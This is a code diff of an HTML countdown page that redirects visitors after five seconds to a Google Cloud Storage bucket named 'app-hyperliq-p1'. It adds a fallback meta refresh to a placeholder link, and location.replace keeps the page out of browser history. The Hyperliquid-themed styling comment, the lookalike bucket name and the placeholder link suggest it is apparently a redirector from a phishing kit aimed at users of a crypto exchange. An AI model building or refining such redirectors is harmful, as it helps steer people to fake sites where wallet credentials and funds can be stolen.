@@ -5,16 +5,19 @@
   <title>Redirecting...</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
+  <!-- fallback редирект -->
+  <meta http-equiv="refresh" content="6;url=https://YOUR-LINK-HERE.com">
+
   <style>
     body {
       margin: 0;
       height: 100vh;
-      background: #000000;
+      background: #000;
       display: flex;
       align-items: center;
       justify-content: center;
       font-family: Arial, Helvetica, sans-serif;
-      color: #d1ffe8; /* светлый hyperliquid */
+      color: #d1ffe8;
     }
 
     .container {
@@ -59,17 +62,17 @@
 
   <script>
     let seconds = 5;
-    const countdownEl = document.getElementById("countdown");
+    const el = document.getElementById("countdown");
 
-    const redirectUrl = "https://storage.googleapis.com/app-hyperliq-p1/index.html"; КУ
+    const redirectUrl = "https://storage.googleapis.com/app-hyperliq-p1/index.html";
 
     const timer = setInterval(() => {
       seconds--;
-      countdownEl.textContent = seconds;
+      el.textContent = seconds;
 
       if (seconds <= 0) {
         clearInterval(timer);
-        window.location.href = redirectUrl;
+        window.location.replace(redirectUrl);
       }
     }, 1000);
   </script>
